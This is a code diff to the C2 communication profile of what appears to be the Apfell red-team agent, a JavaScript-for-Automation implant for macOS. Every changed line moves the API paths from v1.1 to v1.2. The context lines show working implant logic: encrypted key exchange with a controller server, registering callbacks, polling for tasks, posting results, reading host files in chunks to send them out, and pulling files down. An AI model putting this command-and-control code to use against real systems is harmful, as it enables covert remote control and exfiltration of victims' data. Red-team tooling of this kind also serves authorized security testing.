@@ -77,7 +77,7 @@ class customC2 extends baseC2{
 	    // Encrypt our initial message with sessionID and Public key with the initial AES key
 	    while(true){
 	        try{
-                var base64_pub_encrypted = this.htmlPostData("api/v1.1/crypto/EKE/" + apfell.uuid, initial_message);
+                var base64_pub_encrypted = this.htmlPostData("api/v1.2/crypto/EKE/" + apfell.uuid, initial_message);
                 var pub_encrypted = $.NSData.alloc.initWithBase64Encoding(base64_pub_encrypted);
                 // Decrypt the response with our private key
                 var decrypted_message = $.SecKeyCreateDecryptedData(privatekey, $.kSecKeyAlgorithmRSAEncryptionOAEPSHA1, pub_encrypted, Ref());
@@ -117,11 +117,11 @@ class customC2 extends baseC2{
 		//gets back a unique ID
 		if(this.exchanging_keys){
 		    var sessionID = this.negotiate_key();
-		    var jsondata = this.htmlPostData("api/v1.1/crypto/EKE/" + sessionID, JSON.stringify(info));
+		    var jsondata = this.htmlPostData("api/v1.2/crypto/EKE/" + sessionID, JSON.stringify(info));
 		}else if(this.aes_psk != ""){
-            var jsondata = this.htmlPostData("api/v1.1/crypto/aes_psk/" + apfell.uuid, JSON.stringify(info));
+            var jsondata = this.htmlPostData("api/v1.2/crypto/aes_psk/" + apfell.uuid, JSON.stringify(info));
 		}else{
-		    var jsondata = this.htmlPostData("api/v1.1/callbacks/", JSON.stringify(info));
+		    var jsondata = this.htmlPostData("api/v1.2/callbacks/", JSON.stringify(info));
 		}
 		apfell.id = jsondata.id;
 		// if we fail to get a new ID number, then exit the application
@@ -131,7 +131,7 @@ class customC2 extends baseC2{
 	getTasking(){
 		while(true){
 		    try{
-		        var url = this.baseurl + "api/v1.1/tasks/callback/" + apfell.id + "/nextTask";
+		        var url = this.baseurl + "api/v1.2/tasks/callback/" + apfell.id + "/nextTask";
 		        var task = this.htmlGetData(url);
 		        return JSON.parse(task);
 		    }
@@ -143,7 +143,7 @@ class customC2 extends baseC2{
 	}
 	postResponse(task, output){
 	    // this will get the task object and the response output
-	    return this.postRESTResponse("api/v1.1/responses/" + task.id, output);
+	    return this.postRESTResponse("api/v1.2/responses/" + task.id, output);
 	}
 	postRESTResponse(urlEnding, data){
 		//depending on the amount of data we're sending, we might need to chunk it
@@ -241,7 +241,7 @@ class customC2 extends baseC2{
         // download just has one parameter of the path of the file to download
         if( does_file_exist(params)){
             var offset = 0;
-            var url = "api/v1.1/responses/" + task.id;
+            var url = "api/v1.2/responses/" + task.id;
             var chunkSize = 512000; //3500;
             var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
             // Get the file size by seeking;
@@ -271,7 +271,7 @@ class customC2 extends baseC2{
                     data = handle.readDataOfLength(chunkSize);
                 }
                 var output = "Finished downloading file with id: " + registerFile['file_id'];
-                output += "\nBrowse to /api/v1.1/files/download/" + registerFile['file_id'];
+                output += "\nBrowse to /api/v1.2/files/download/" + registerFile['file_id'];
             }
             else{
                var output = "Failed to register file to download";
@@ -284,7 +284,7 @@ class customC2 extends baseC2{
 	}
 	upload(task, params){
 	    try{
-	        var url = "api/v1.1/files/" + params + "/callbacks/" + apfell.id;
+	        var url = "api/v1.2/files/" + params + "/callbacks/" + apfell.id;
             var file_data = this.htmlGetData(this.baseurl + url);
             if(file_data === undefined){
                 throw "Got nothing from the Apfell server";
